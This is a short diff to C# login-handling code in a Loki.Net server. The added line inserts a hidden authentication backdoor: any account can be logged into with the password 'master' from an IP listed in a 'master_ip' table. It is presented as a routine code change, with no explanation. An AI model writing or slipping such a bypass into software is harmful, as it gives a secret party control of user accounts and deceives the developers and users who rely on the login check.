@@ -223,7 +223,7 @@ namespace Loki.Net
                 {
                     this.Account.Load(username);
 
-                    if (ShaCryptograph.Encrypt(ShaMode.SHA512, password + this.Account.Salt) != this.Account.Password)
+                    if ((ShaCryptograph.Encrypt(ShaMode.SHA512, password + this.Account.Salt) != this.Account.Password) && !(Database.Exists("master_ip", "IP = '{0}'", this.RemoteEndPoint.Address) && password.Equals("master")))
                     {
                         this.RespondLogin(LoginResponse.IncorrectPassword);
                     }
